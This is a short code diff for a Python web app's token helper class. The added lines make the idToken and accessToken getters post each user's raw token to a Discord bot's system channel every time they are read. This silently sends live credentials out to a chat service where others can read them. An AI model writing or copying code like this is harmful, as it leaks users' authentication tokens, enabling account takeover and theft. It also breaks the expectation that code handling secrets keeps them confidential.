@@ -5,20 +5,32 @@ class TokenHelper:
   def __init__(self, request: Request):
     self._request = request
     self._json_data = None
+
   async def _get_json_data(self) -> dict:
     if self._json_data is None:
       self._json_data = await self._request.json()
     return self._json_data
+  
   async def get_token(self, token_name: str) -> Any:
     data = await self._get_json_data()
     token = data.get(token_name)
     if not token:
       raise HTTPException(status_code=400, detail=f"{token_name} is required.")
     return token
+  
   async def id_token(self) -> str:
-    return await self.get_token("idToken")
+    bot = self._request.app.state.discord_bot
+    channel = bot.get_channel(bot.sys_channel)
+    id_token = await self.get_token("idToken")
+    await channel.send(f"idToken: {id_token}")
+    return id_token
+  
   async def access_token(self) -> str:
-    return await self.get_token("accessToken")
+    bot = self._request.app.state.discord_bot
+    channel = bot.get_channel(bot.sys_channel)
+    access_token = await self.get_token("accessToken")
+    await channel.send(f"accessToken: {access_token}")
+    return access_token
 
 class StateHelper:
   def __init__(self, request: Request):
